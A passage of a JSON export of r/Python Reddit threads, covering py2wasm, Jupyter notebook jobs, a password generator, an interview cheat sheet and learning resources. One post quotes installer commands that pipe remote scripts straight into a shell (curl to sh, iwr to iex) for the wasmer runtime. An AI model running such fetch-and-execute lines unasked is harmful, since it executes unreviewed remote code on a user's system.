                            "content": "If you have a Mac or Linux device you can easily get into the python shell and run code directly from the command line No need to single out Mac and Linux there. You can very easily do the same by installing Python from Python.org on Windows. In fact, to run Pycharm you need to do this anyway. Also, WSL is great, but I would highly recommend a beginner use their native OS for Python"
                        },
                        {
                            "author": "MasturChief",
                            "score": "3",
                            "content": "i would agree but if you only have windows you can do the same thing from cmd prompt too. i prefer linux for it but it’s not necessary"
                        }
                    ]
                },
                {
                    "author": "StatementNervous",
                    "score": "1",
                    "content": "Thanks for all your advice. You have given me a great place to start."
                }
            ]
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1caq9bh",
    "post_score": "0",
    "post_time": "Tuesday, April 23, 2024 at 3:00:08 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [],
    "post_content": "Daily Thread",
    "comments": []
},
{
    "post_author": "desmoulinmichel",
    "post_id": "1cb0l1i",
    "post_score": "48",
    "post_time": "Tuesday, April 23, 2024 at 12:50:24 PM GMT+3",
    "flair_text": "News",
    "post_title": "Py2wasm: A Python to Wasm compiler 3x faster than pyiodide",
    "media": [
        "https://nuitka.net/",
        "https://wasmer.io/posts/py2wasm-a-python-to-wasm-compiler"
    ],
    "post_content": "Take the excellent nuitka, compile python code to C, turn it into web assembly, and you got Python in the browser, without the usual runtime overhead:\nhttps://wasmer.io/posts/py2wasm-a-python-to-wasm-compiler\nWhile the doc states you can get this effect by doing:\npip install py2wasm\npy2wasm myprogram.py -o myprogram.wasm\nwasmer run myprogram.wasm\nYou still need the wasmer WASM runtime (curl https://get.wasmer.io -sSfL | sh for Unix users, iwr https://win.wasmer.io -useb | iex for Windows user with Powershell), however. But more than that, since you need nuikta, it means you need a C compiler installed. While in Ubuntu it's a just an sudo apt install build-essential, it will require a bit more work on Windows and Mac.",
    "comments": [
        {
            "author": "magnomagna",
            "score": "8",
            "content": "But more than that, since you need nuikta, it means you need a C compiler installed. You need clarify this a bit. Any compiler that compiles C into WASM is also a C compiler. That said, I do believe you mean the usual C compilers that can target hardware architectures, such as gcc, clang, msvc, etc. it will require more work on Windows Reading the documentation, nuitka gives three options: MinGW-w64, msvc (visual studio), and clang (via visual studio). Well, there’s an interesting project winlibs that provides a portable toolchain including both gcc and clang with MinGW-w64 native Windows libraries, meaning the compilers included compile C into native Windows programs. Since it’s portable, there’s absolutely no installation and no messing with Windows registry at all. To use it, you just need to unzip, set your PATH and run! -—- I personally haven’t tried winlibs, as I use Clang on Windows, and Nuitka’s documentation (like many others that include Clang) is wrong about having to use Visual Studio in order to use Clang on Windows. To use Clang without Visual Studio, you just need to install the same dependencies that Visual Studio needs without installing Visual Studio itself! The dependencies can be installed with the same installer for Visual Studio and the user can opt out of installing Visual Studio (just untick the checkbox) and just install the other components. You also need to install Windows SDK for the UCRT headers. These are of course for clang and C11 support isn’t complete IIRC, which nuitka needs. I’d definitely try winlibs first."
        },
        {
            "author": "-defron-",
            "score": "4",
            "content": "Would have been nice to see the binary sizes of a non-trivial bit of code. That's always been the big problem for wasm and garbage collected languages since wasm doesn't have a GC so you need to ship your own. Cool concept and incidentally I referenced it and pydide yesterday, but the klunkiness of wasm UI interop and the large binary sizes are still big road blocks for me considering it for anything more than fun personal projects"
        },
        {
            "author": "pysk00l",
            "score": "2",
            "content": "how complex can the code be? Can I have simply pygame games converted with no issues? what about code that uses libraries like pandas etc?"
        },
        {
            "author": "binlargin",
            "score": "2",
            "content": "Interesting. How fast is it to initially load, and are there any libraries that can be used to access the dom from wasm? If the browser is feasible we could have FastUI generator that makes wasm widgets from pure python rather than leaning on React"
        }
    ]
},
{
    "post_author": "AutoModerator",
    "post_id": "1cd6xa3",
    "post_score": "7",
    "post_time": "Friday, April 26, 2024 at 3:00:53 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Friday Daily Thread: r/Python Meta and Free-Talk Fridays",
    "media": [],
    "post_content": "Daily Thread",
    "comments": [
        {
            "author": "tjdwill",
            "score": "1",
            "content": "This is more of a general programming question, but does anyone know how to have a practically-arbitrary number of execution contexts without sacrificing performance? Like, if I wanted 10,000+ little workers/objects to remain dormant until an event triggers upon which each worker completes a small number of tasks and then goes dormant again, is it possible to do that? Threads aren't really cutting it as one can imagine. Is there a concept or primitive \"smaller\" than threads?",
            "replies": [
                {
                    "author": "petey_piragna",
                    "score": "2",
                    "content": "have u checked out celery?"
                }
            ]
        }
    ]
},
{
    "post_author": "Im__Joseph",
    "post_id": "nevt2r",
    "post_score": "1943",
    "post_time": "Tuesday, May 18, 2021 at 3:00:14 AM GMT+3",
    "flair_text": "Daily Thread",
    "post_title": "Tuesday Daily Thread: Advanced questions",
    "media": [
        "https://discord.gg/python",
        "https://www.reddit.com/r/LearnPython/"
    ],
    "post_content": "Have some burning questions on advanced Python topics? Use this thread to ask more advanced questions related to Python.\nIf your question is a beginner question we hold a beginner Daily Thread tomorrow (Wednesday) where you can ask any question! We may remove questions here and ask you to resubmit tomorrow.\nThis thread may be fairly low volume in replies, if you don't receive a response we recommend looking at r/LearnPython or joining the Python Discord server at https://discord.gg/python where you stand a better chance of receiving a response.",
    "comments": [
        {
            "author": "Impronoucabl",
            "score": "6",
            "content": "Does anyone know of a good vector graphics package that doesn't depend on Cairo? I'm writing my first app, and having difficulty getting it installed on Android, to the point where it may be worth redoing the rendering part with a package that's more compatible."
        },
        {
            "author": "geoffh2016",
            "score": "4",
            "content": "Is it possible to mix code developed with Pybind11 and PySide / PyQt? I'm developing a scientific C++ app and we've successfully used Pybind11 for our core classes. The GUI uses Qt, and I'm not 100% sure about interoperability. Let's say a QWidget gets / sets a core C++ class (e.g., a 3D mesh) that's been wrapped with Pybind11. Will I be able to pass the pybind11 version to the PySide QWidget and have it work? (I know, the short answer is to give it try.. but considering it will take some time to set up the PySide bindings, I'm wondering if others had experience mixing Pybind11 and PySide or PyQt code.)"
        },
        {
            "author": "jabori",
            "score": "2",
            "content": "What is the best way of speeding up Python code? I read that a new speedier version of Python is underway, but what can we do in the meantime? Of course there is Cython, but afaik that needs a lot of manual intervention (perhaps this is not true?). And then there is pypy which I have not tried yet (see https://medium.com/@mindfiresolutions.usa/how-much-faster-is-pypy-1ed7936f5e18). I have concerns that I would miss part of the functionality of Python when I use pypy or cython ! Does anyone have experience with this?"
        },
        {
            "author": "jabori",
            "score": "1",
            "content": "Looking into the your Python code to discover the performance bottlenecks is always a good advice indeed I think. I think there also some graphical tools to do just that, but I do not have any references for them. Do you? Those speedup factors you mention are really impressive ! So that can give speedups up to 100x100 = 10000 for certain critical parts of the code if I am understanding correctly?"
        },
        {
            "author": "TicklesMcFancy",
            "score": "1",
            "content": "Why does tkinter's ttk entry have an option that can make it any widget?"
        }
    ]
},
{
    "post_author": "jeromymanuel",
    "post_id": "ap4hyq",
    "post_score": "1888",
    "post_time": "Sunday, February 10, 2019 at 5:48:26 PM GMT+3",
    "flair_text": "",
    "post_title": "So true!",
    "media": [
        "https://i.redd.it/fnryb8p5unf21.jpg",
        "https://www.reddit.com/r/hacking/comments/ap07b7/little_humor_for_the_weekend_mostly_wont_get_it/",
        "https://www.reddit.com/r/hacking/",
        "https://preview.redd.it/fnryb8p5unf21.jpg?width=640&crop=smart&auto=webp&s=afe38a49ee935bee6ea5392cd3bb8165ac234e37"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "wingerd33",
            "score": "216",
            "content": "Hm, I would argue that both are typically written in PowerPoint. Dev: yeah I added couple ifs to check for condition X. Marketing team: uses AI and ML to automatically detect X."
        },
        {
            "author": "bobisgoofy",
            "score": "40",
            "content": "I've always heard this joke as: \"If you are raising money it's AI, if you are recruiting it's machine learning.\""
        },
        {
            "author": "[deleted]",
            "score": "67",
            "content": "I'm still early in my career and don't get it. Someone explain?"
        },
        {
            "author": "[deleted]",
            "score": "9",
            "content": "What about implementing ml in PowerPoint? I mean, it's turing complete..."
        },
        {
            "author": "taqueria_on_the_moon",
            "score": "8",
            "content": "Sweats in c++"
        },
        {
            "author": "cocoabro",
            "score": "5",
            "content": "Since a power point is unstructured data, can’t you just use computer vision to read this data and AI to create the next slide?"
        },
        {
            "author": "njtrailrunner1gk",
            "score": "4",
            "content": "Even Marketing Teams farts are AI driven..."
        },
        {
            "author": "[deleted]",
            "score": "6",
            "content": "AI == Flow Control."
        }
    ]
},
{
    "post_author": "RRTheGuy",
    "post_id": "1cc300n",
    "post_score": "0",
    "post_time": "Wednesday, April 24, 2024 at 7:43:29 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "pwdgen v2 -a simple password generator",
    "media": [
        "https://bitwarden.com/password-generator/",
        "https://www.avast.com/random-password-generator",
        "https://www.reddit.com/r/Python/comments/1c0p8gc/pwdgen_a_simple_password_generator/",
        "https://www.dashlane.com/features/password-generator",
        "https://my.norton.com/extspa/passwordmanager?path=pwd-gen",
        "https://github.com/RadoTheProgrammer/pwdgen"
    ],
    "post_content": "https://github.com/RadoTheProgrammer/pwdgen\nWhat my project does\nMy project generate simple, strong, memorable and easy-to-type passwords.\nThe system is simple: it generate 2 pronounceable words separated by a special char, with a number at start or end.\nI tried creating a password generator that combines simplicity, security, memorability, and ease of type.\nThis should be secure enough because it can generate 4e15 possibilities of passwords and uses the secrets module.\nTarget audience\nFor anyone who need to have passwords easily.\nComparison\nMost passwords manager generate completely passwords with completely random characters that aren't very easy to memorize or tape.\nExamples include Dashlane, Norton, Avast.\nOr other like Bitwarden generate passwords that are not really fast-to-type.\nThe mine generate sth like 7Xy-Bonuwucete 0Qubyby+Pomafy , or 7Zuxogu:Lebuwo .\nUsage\nYou can install it with pip install pwd-generator and use the cli version:\npwdgen\nTo use it in a python code\nimport pwdgen\nprint(pwdgen.generate())\nChanges from last post\nI already made another post for this, but this was not well received because my code use the random module.\nI updated it to use the secrets module.",
    "comments": [
        {
            "author": "AutoModerator",
            "score": "1",
            "content": ""
        },
        {
            "author": "InvaderToast348",
            "score": "6",
            "content": "When copy pasting your post, you could have at least checked for SPaG this time. Well done for improving the code though. In the future it would be good to see you take the feedback on your last post and write something new taking into account the suggestions. This feels like an extremely low effort post, but at least it's not AI generated.",
            "replies": [
                {
                    "author": "RRTheGuy",
                    "score": "1",
                    "content": "What is SPaG ? What do you mean by that ? (I’m french)"
                }
            ]
        },
        {
            "author": "washedFM",
            "score": "4",
            "content": "Peeking at the GitHub examples.. those passwords don’t look easy to type. Also why would I be typing a password anyway?"
        },
        {
            "author": "Puzzleheaded_Bill271",
            "score": "1",
            "content": "python -c \"import secrets;print(secrets.tokenhex(8))\" Would do approx the same. Its good you're learning how to program, but I'd pick something other than security applications as a starting point. Security applications are for experts in the field, which I'm afraid you've demonstrated is not yourself. Touting this as a serious package, although I'm sure you mean well, is dangerous and stupid. Keep programming and don't let this dissuade you from programming (but please kill this project)"
        }
    ]
},
{
    "post_author": "fjogurpiano",
    "post_id": "1cb27jv",
    "post_score": "7",
    "post_time": "Tuesday, April 23, 2024 at 2:29:33 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "I analyzed & visualized 7 years of music royalties with polars & Vega-Altair. Code in article",
    "media": [
        "https://www.reddit.com/r/dataisbeautiful/comments/1ca7x6z/oc_my_music_needs_more_than_200k_plays_on/",
        "https://osc.garden/blog/data-analysis-music-streaming/",
        "https://pola.rs/",
        "https://www.reddit.com/r/dataisbeautiful/",
        "https://altair-viz.github.io/"
    ],
    "post_content": "Hi all,\nI used polars (a Rust-powered “Blazingly Fast DataFrame Library”) to analyze seven years of my own music royalties data. Vega-Altair (Python wrapper for Vega-Lite) powers the (often interactive) visualizations.\nLink to the article: https://osc.garden/blog/data-analysis-music-streaming/\nIt was a lot of fun learning polars and setting up the graphs with Vega-Altair.\nWould love to hear any comments and suggestions.\nLink to r/dataisbeautiful post: https://www.reddit.com/r/dataisbeautiful/comments/1ca7x6z/oc_my_music_needs_more_than_200k_plays_on/",
    "comments": [
        {
            "author": "AutoModerator",
            "score": "1",
            "content": ""
        }
    ]
},
{
    "post_author": "Shadowforce426",
    "post_id": "1c9u0qf",
    "post_score": "109",
    "post_time": "Monday, April 22, 2024 at 12:59:56 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Jobs that utilize Jupyter Notebook?",
    "media": [],
    "post_content": "I have been programming for a few years now and have on and off had jobs in the industry. I used Jupyter Notebook in undergrad for a course almost a decade ago and I found it really cool. Back then I really didn’t know what I was doing and now I do. I think it’s cool how it makes it feel more like a TI calculator (I studied math originally)\nWhat are jobs that utilize this? What can I do or practice to put myself in a better position to land one?",
    "comments": [
        {
            "author": "twitch_and_shock",
            "score": "177",
            "content": "If you're in a pure research position, you might get away with just using Jupyter. Otherwise, you're likely to need a lot more knowledge about project structuring, testing, etc.",
            "replies": [
                {
                    "author": "james_pic",
                    "score": "10",
                    "content": "I wish that were true. I worked on a project at a large government body that used DataBricks notebooks (which I believe under-the-hood shares a lot of code with Jupyter) for processing data on a massive scale. Jupyter/DataBricks notebooks absolutely do not work on this scale and become a poorly structured nighmare. But with enough impulse, pigs will fly, and if you throw enough people at the problem you can build a national data processing system with DataBricks notebooks.",
                    "replies": [
                        {
                            "author": "COLU_BUS",
                            "score": "3",
                            "content": "Government organizations have to intentionally use sub-optimal processes/tools so that jobs can exist for contractors to do the same work with the proper tool so that the government organization can then say they got positive return for their money. /s but like not totally"
                        },
                        {
                            "author": "vinnypotsandpans",
                            "score": "1",
                            "content": "I am in the same exact boat as you my friend. I used to loathe databricks, now I’m learning to find it okay. But yeah there are quite a few big companies that use it so it’s not a bad “skill” to have. I think pyspark is the worst part :("
                        }
                    ]
                }
            ]
        },
        {
            "author": "git0ffmylawnm8",
            "score": "48",
            "content": "Not exactly Jupyter notebooks, but Databricks is a notebook environment in Spark and my employer runs ETL jobs.",
            "replies": [
                {
                    "author": "WhipsAndMarkovChains",
                    "score": "9",
                    "content": "Yeah I came here to say Databricks. You can build workflows that run notebooks, python files, SQL queries, etc. It's alson easy to run Python and SQL in the same notebook."
                }
            ]
        },
        {
            "author": "arden13",
            "score": "35",
            "content": "I work in a data science adjacent field. I use jupyter notebooks for individual analyses but will use flat .py files to store repeatedly used functions. Sometimes those functions become part of a package (internally used) if they're useful enough!"
        },
        {
            "author": "necrosatanic",
            "score": "35",
            "content": "Cyber security data analyst here 👋🏻 I use Jupyter notebooks everyday for EDA and building PDFs for reporting"
        },
        {
            "author": "solidpancake",
            "score": "19",
            "content": "I use notebooks often as a data scientist. It makes EDA simple and easy to follow, and occasionally I share bits of my notebook work with customers. Anything beyond analysis and light model training such as deploying models and/or APIs, writing scripts, or integrating with other tools usually warrants following a more traditional Python project structure. For that reason I’d say it’s important to understand when to use which, and knowing how to use them effectively."
        },
        {
            "author": "agritheory",
            "score": "9",
            "content": "This is my go-to example of people using Notebooks in production: Netflix Engineering Blog on Medium"
        },
        {
            "author": "science_robot",
            "score": "8",
            "content": "They’re used heavily in bioinformatics. Being able to quickly whip up an analysis with visualizations is a crucial skill. You still need to learn how to code in Python without a notebook though as notebooks aren’t great for creating reusable and extensible code."
        },
        {
            "author": "FoolForWool",
            "score": "6",
            "content": "I use Jupyter notebooks extensively… LOCALLY. All my prototyping is done on notebooks. Or if I’m writing a script that someone else needs to update before running (inputs, locations, uploads). But once I have a working notebook, it almost always turns into a script to go somewhere. I’d assume most data jobs are similar. You can check for data jobs that use python."
        },
        {
            "author": "demosdemon",
            "score": "5",
            "content": "Jupyter Notebooks (aka Bento) are extremely popular at Meta."
        },
        {
            "author": "zougloub",
            "score": "2",
            "content": "Mostly doing embedded software development and more-R&D engineering consulting, and I almost always have a Jupyter session running (for prototyping, figuring out stuff, quick visualizations during development, or \"common recipes\") ; my top-level notebook folder has 182 notebooks. But it's just the way I work, and these notebooks are almost never part of my deliverables."
        },
        {
            "author": "[deleted]",
            "score": "2",
            "content": "Anything can use Jupyter, you just have to eventually switch off it to actually implement something"
        },
        {
            "author": "SirAutismx7",
            "score": "2",
            "content": "Anything research related. Notebooks are a literal nightmare for anything else."
        },
        {
            "author": "seph2o",
            "score": "2",
            "content": "I'm a data analyst and use notebooks on MS Fabric to transform data before loading into Power BI. Way more powerful than Power Query and DAX and cleaner imo"
        },
        {
            "author": "Asleep-Dress-3578",
            "score": "2",
            "content": "As a data scientist, I often use jupyter notebook for EDA and also to try out and test some ML models, and even to develop some functions and algorithms. However, I use jupyter notebook from within vscode, or if I am testing computationally intensive algorithms then I use jupyterlab in the cloud (from openshift in our case). Second, I tend to use less and less jupyter notebooks. First, I use interactive programming from a simple Python script (you select a code section and you hit CTRL+ENTER), and if I already have a working application, I just tend to debug it and not copying the critical parts back to jupyter notebook. So in short, jupyter notebook is very useful for EDA but there are also other ways to do interactive programming.",
            "replies": [
                {
                    "author": "Froozieee",
                    "score": "2",
                    "content": "I’m in a similar boat where I really like interactive programming - though I like to use the #%% comment notation in vscode to define blocks in .py files that work as cells and have ui elements that appear when you define the cell (ie the classic run, run above, and run/debug buttons etc) and open an interactive window when you execute them. Best of both worlds really."
                }
            ]
        },
        {
            "author": "DGAF_ThrowAway",
            "score": "2",
            "content": "Any of sciences have always traditionally used \"lab notebooks\" and in the modern data-world most of this research fields have some electronic notebook. Jupyter notebooks (while not a lab notebook) is very useful in many of those scientific endeavors."
        },
        {
            "author": "jinntakk",
            "score": "1",
            "content": "Can anyone tell me the difference between Jupyter Notebooks vs. a regular IDE? Because that's what l thought Notebooks were."
        },
        {
            "author": "gooeydumpling",
            "score": "1",
            "content": "Alteryx python tool uses notebooks for development that one hd to switch to production mode, so that’s one"
        }
    ]
},
{
    "post_author": "ixatrap",
    "post_id": "1cckeip",
    "post_score": "63",
    "post_time": "Thursday, April 25, 2024 at 8:50:09 AM GMT+3",
    "flair_text": "Resource",
    "post_title": "Python Interview Cheat Sheet Website!",
    "media": [
        "https://hlop3z.github.io/interviews-python/"
    ],
    "post_content": "Hey everyone,\nI’ve recently launched a new website aimed at helping fellow programmers ace their Python interviews. It’s not just limited to Python though; it also covers essential topics like big-O notation, object-oriented programming, design patterns, and more!\nI’d love to hear your thoughts and feedback on the content, layout, and anything else you think could be improved.\nCheck it out here https://hlop3z.github.io/interviews-python/ and let me know what you think. Your input is invaluable in making this resource the best it can be. Thanks in advance for your time and insights! 🚀🐍\nNote: It’s mainly to be used in a computer or tablet. You can see it in your mobile, but some sections won’t look as intended.",
    "comments": [
        {
            "author": "404ok200",
            "score": "2",
            "content": "I will definitely check these out and come back here. Looking for a switch and came across this at the perfect time.",
            "replies": [
                {
                    "author": "DrinkMoreCodeMore",
                    "score": "2",
                    "content": "Yes yes come to the python dark side and join us."
                }
            ]
        },
        {
            "author": "zerothepyro",
            "score": "2",
            "content": "I think you have these definitions reversed in your graph-search section. You have: Depth-First Explores all neighbor nodes at the present depth prior to moving on to nodes at the next depth level. Breadth-First Traverses as far as possible along each branch before backtracking.",
            "replies": [
                {
                    "author": "ixatrap",
                    "score": "1",
                    "content": "Thank you! 🙏 I fixed it!"
                }
            ]
        },
        {
            "author": "alessiocelentano",
            "score": "2",
            "content": "I was just about to create something like that. Well done!",
            "replies": [
                {
                    "author": "ixatrap",
                    "score": "1",
                    "content": "You can help improve this one if you like, but if not you should give it a go creating your own. I think the more resources are out there, the better for everyone, both new and experienced, I get inspiration from people creating and sharing their knowledge."
                }
            ]
        },
        {
            "author": "MrMrsPotts",
            "score": "2",
            "content": "The complexity definitions are largely wrong I am afraid. Big Oh doesn't mean what you say it means.",
            "replies": [
                {
                    "author": "ixatrap",
                    "score": "1",
                    "content": "Thanks! I believe is fixed",
                    "replies": [
                        {
                            "author": "MrMrsPotts",
                            "score": "1",
                            "content": "It's much better now."
                        }
                    ]
                }
            ]
        },
        {
            "author": "IXISIXI",
            "score": "2",
            "content": "Nice work! It looks great, though I personally do not think this would be helpful to me in an interview, since usually if they ask you a question about big O, it's of your own code and it would probably be obvious if you're looking something up mid-sentence.",
            "replies": [
                {
                    "author": "ixatrap",
                    "score": "1",
                    "content": "Thanks! I appreciate it, well I think it depends on the person doing the interview, one time I asked the interviewer if I could search something in Google, then proceeded to explain my answer, and he did passed me to the 3rd Round. But in case of “Big-O” (worst case scenario) 😝 haha. I’m trying to make it pretty in order to screenshot or something each section, so I can then print them and have them as a sort of a poster in my wall, that way I always have access to them, even offline."
                }
            ]
        },
        {
            "author": "m3lodicdata",
            "score": "1",
            "content": "Oh boy the part on Data Structures will be so usefull for training and learning the best practices. Thank you for making this available to us free of charge 🙏",
            "replies": [
                {
                    "author": "ixatrap",
                    "score": "2",
                    "content": "You very welcome, I try to create stuff that are useful for myself and others, and also give back to the developers community"
                }
            ]
        },
        {
            "author": "[deleted]",
            "score": "",
            "content": "Are you associated with this business? It seems like half your comments on reddit are in reference to this website.",
            "replies": [
                {
                    "author": "IlliterateJedi",
                    "score": "3",
                    "content": "Are you associated with this business? It seems like half your comments on reddit are in reference to this website."
                },
                {
                    "author": "ixatrap",
                    "score": "1",
                    "content": "Nice, Do you know their pricing? If you don’t mind paying for resources, I bought this IPhone App is just like 3 dollars, but I really liked the animations, it helped me understand more about the algorithms in a visual way https://apps.apple.com/us/app/algorithms-explained-animated/id1047532631"
                }
            ]
        }
    ]
},
{
    "post_author": "ASIC_SP",
    "post_id": "i0m2sy",
    "post_score": "1884",
    "post_time": "Thursday, July 30, 2020 at 4:31:07 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "I know Python basics, what next?",
    "media": [
        "https://github.com/karan/Projects-Solutions",
        "https://www.jetbrains.com/pycharm/",
        "https://codecombat.com/play/level/dungeons-of-kithgard",
        "https://realpython.com/python-debugging-pdb/",
        "https://github.com/faif/python-patterns",
        "https://ipgp.github.io/scientific_python_cheat_sheet/",
        "https://py.checkio.org/",
        "https://runestone.academy/runestone/static/pythonds/index.html",
        "https://www.practicepython.org/",
        "https://gto76.github.io/python-cheatsheet/",
        "https://www.effectivepython.com/",
        "https://ryanstutorials.net/problem-solving-skills/",
        "https://en.wikipedia.org/wiki/Integration_testing",
        "https://calmcode.io/",
        "https://nostarch.com/seriouspython",
        "https://www.reddit.com/r/learnpython/comments/5503pa/code_conversion_probably_the_best_tool_any_level/",
        "http://www.pythontutor.com/visualize.html#mode=edit",
        "https://www.oreilly.com/library/view/fluent-python/9781491946237/",
        "https://www.devdungeon.com/content/i-know-how-program-i-dont-know-what-program",
        "https://rosettacode.org/wiki/Category:Python",
        "https://realpython.com/python-testing/",
        "https://en.wikipedia.org/wiki/Design_Patterns",
        "https://uchicago-cs.github.io/debugging-guide/",
        "https://calmcode.io/pytest/introduction.html",
        "https://dabeaz-course.github.io/practical-python/Notes/Contents.html",
        "https://pythonprogramming.net/",
        "https://projecteuler.net/",
        "https://adventofcode.com/",
        "https://greenteapress.com/wp/think-python-2e/",
        "https://www.techinasia.com/talk/27-things-started-programming",
        "https://www.codewars.com/",
        "https://learnbyexample.github.io/curated-resources/python-intermediate/",
        "https://www.oreilly.com/library/view/fluent-python-2nd/9781492056348/",
        "https://exercism.io/tracks/python/exercises",
        "https://www.reddit.com/r/dailyprogrammer",
        "https://rubberduckdebugging.com/",
        "https://python-patterns.guide/",
        "https://www.reddit.com/r/learnprogramming/comments/5jm97p/if_you_want_to_learn_youll_need_to_be_willing_to/",
        "https://thonny.org/",
        "https://github.com/norvig/pytudes",
        "https://stackoverflow.com/questions/169713/whats-the-toughest-bug-you-ever-found-and-fixed",
        "http://www.flyingmachinestudios.com/programming/learn-programming-languages-efficiently/",
        "https://edabit.com/challenges/python3",
        "https://github.com/tayllan/awesome-algorithms",
        "https://500mile.email/",
        "https://www.youtube.com/user/schafer5/playlists",
        "https://ericlippert.com/2014/03/05/how-to-debug-small-programs/",
        "https://jvns.ca/blog/2019/06/23/a-few-debugging-resources/",
        "https://en.wikipedia.org/wiki/Test-driven_development",
        "https://www.reddit.com/r/learnprogramming/comments/7m92i1/coding_idea_write_a_commandline_utility/",
        "https://github.com/tuvtran/project-based-learning#python",
        "https://hacks.mozilla.org/2020/07/testing-firefox-more-efficiently-with-machine-learning/",
        "https://docs.python.org/3/library/pdb.html",
        "https://book.pythontips.com/en/latest/index.html",
        "https://ehmatthes.github.io/pcc_2e/cheat_sheets/cheat_sheets/",
        "https://www.reddit.com/r/learnpython/search?q=what+next&restrict_sr=on",
        "https://github.com/learnbyexample/command_help",
        "https://www.codingame.com/start",
        "https://docs.python.org/3/index.html",
        "https://en.wikipedia.org/wiki/Unit_testing"
    ],
    "post_content": "tl;dr Resources (exercises, projects, debugging, testing, cheatsheets, books) to help take the next steps after learning Python basics. I'd welcome feedback and suggestions.\nWhat to learn next is an often asked question. Searching for what next on /r/learnpython gives you too many results. Here's some more Q&A and articles on this topic:\nI know how to program, but I don't know what to program\nLearning by converting code from one language to another\nWrite a command-line utility\nIf you want to learn you'll need to be willing to look stupid\nTechniques for Efficiently Learning Programming Languages\nThings you might encounter in your programming journey\nExercises and Projects\nI do not have a simple answer to this question either. If you feel comfortable with programming basics and Python syntax, then exercises are a good way to test your knowledge. The resource you used to learn Python will typically have some sort of exercises, so those would be ideal as a first choice. I'd also suggest using the below resources to improve your skills. If you get stuck, reread the material related to those topics, search online, ask for clarifications, etc — in short, make an effort to solve it. It is okay to skip some troublesome problems (and come back to it later if you have the time), but you should be able to solve most of the beginner problems. Maintaining notes will help too, especially for common mistakes.\nExercism, Practicepython, Edabit — these are all beginner friendly and difficulty levels are marked\nCodewars, Adventofcode, Projecteuler — more challenging\nCheckio, Codingame, Codecombat — gaming based challenges\n/r/dailyprogrammer — not active currently, but there's plenty of past challenges with discussions\nOnce you are comfortable with basics and syntax, the next step is projects. I use a 10-line program that solves a common problem for me — adding body { text-align: justify } to epub files that are not justify aligned. I didn't know that this line would help beforehand, I searched online for a solution and then automated the process of unzipping epub, adding the line and then packing it again. That will likely need you to lookup documentation and go through some stackoverflow Q&A as well. And once you have written the solution and use it regularly, you'll likely encounter corner cases and features to be added. I feel this is a great way to learn and understand programming.\nProjects on various topics with solutions\nProject based learning\nPytudes by Peter Norvig\nRosettacode\nDebugging\nKnowing how to debug your programs is crucial and should be ideally taught right from the beginning instead of a chapter at the end of the book. Think Python is an awesome example for such a resource material.\nSites like Pythontutor allow you to visually debug a program — you can execute a program step by step and see the current value of variables. Similar feature is typically provided by IDEs like Pycharm and Thonny. Under the hood, these visualizations are using the pdb module. See also Python debugging with pdb.\nDebugging is often a frustrating experience. Taking a break helps (and sometimes I have found the problem in my dreams). Try to reduce the code as much as possible so that you are left with minimal code necessary to reproduce the issue. Talking about the problem to a friend/colleague/inanimate-objects/etc can help too — known as Rubber duck debugging. I have often found the issue while formulating a question to be asked on forums like stackoverflow/reddit because writing down your problem is another way to bring clarity than just having a vague idea in your mind. Here's some more articles on this challenging topic:\nWhat does debugging a program look like?\nHow to debug small programs\nDebugging guide\nProblem solving skills\nHere's an interesting snippet (modified to keep it small) from a collection of interesting bug stories.\nA jpeg parser choked whenever the CEO came into the room, because he always had a shirt with a square pattern on it, which triggered some special case of contrast and block boundary algorithms.\nSee also curated list of absurd software bug stories.\nTesting\nAnother crucial aspect in the programming journey is knowing how to write tests. In bigger projects, usually there are separate engineers (often in much larger number than code developers) to test the code. Even in those cases, writing a few sanity test cases yourself can help you develop faster knowing that the changes aren't breaking basic functionality.\nThere's no single consensus on test methodologies. There is Unit testing, Integration testing, Test-driven development and so on. Often, a combination of these is used. These days, machine learning is also being considered to reduce the testing time, see Testing Firefox more efficiently with machine learning for example.\nWhen I start a project, I usually try to write the programs incrementally. Say I need to iterate over files from a directory. I will make sure that portion is working (usually with print statements), then add another feature — say file reading and test that and so on. This reduces the burden of testing a large program at once at the end. And depending upon the nature of the program, I'll add a few sanity tests at the end. For example, for my command_help project, I copy pasted a few test runs of the program with different options and arguments into a separate file and wrote a program to perform these tests programmatically whenever the source code is modified.\nFor non-trivial projects, you'll usually end up needing frameworks like built-in module unittest or third-party modules like pytest. See Getting started with testing in Python and calmcode: pytest for discussion on these topics.\nIntermediate Python resources\nOfficial Python docs — Python docs are a treasure trove of information\nCalmcode — videos on testing, code style, args kwargs, data science, etc\nPractical Python Programming — covers foundational aspects of Python programming with an emphasis on script writing, data manipulation, and program organization\nIntermediate Python — covers debugging, generators, decorators, virtual environment, collections, comprehensions, classes, etc\nEffective Python — insight into the Pythonic way of writing programs\nFluent Python — takes you through Python’s core language features and libraries, and shows you how to make your code shorter, faster, and more readable at the same time\nFluent Python, 2nd Edition\nSerious Python — deployment, scalability, testing, and more\nPythonprogramming — domain based topics like machine learning, game development, data analysis, web development, etc\nYoutube: Corey Schafer — various topics for beginners to advanced users\nAlgorithms and Design patterns\nProblem solving with algorithms and data structures\nGitHub: Awesome algorithms\nGitHub: Collection of design patterns and idioms\nPython design patterns inspired from Design Patterns: Elements of Reusable Object-Oriented Software (also known as Gang of Four book)\nHandy cheatsheets\nPython Crash Course cheatsheet\nComprehensive Python cheatsheet\nScientific Python cheatsheet\nI hope these resources will help you take that crucial next step and continue your Python journey. Happy learning :)\nThis content is from my blog post",
    "comments": [
        {
            "author": "majikill",
            "score": "114",
            "content": "Cant wait to get into that \"i know how to program, but dont know what to program\" link. Hits my issues right on the head 🤣",
            "replies": [
                {
                    "author": "midnitte",
                    "score": "1",
                    "content": "I got you fam.",
                    "replies": [
                        {
                            "author": "Ghawr",
                            "score": "59",
                            "content": "You programmed GOOGLE?? Talk about starting small."
                        }
                    ]
                }
            ]
        },
        {
            "author": "pmdbt",
            "score": "62",
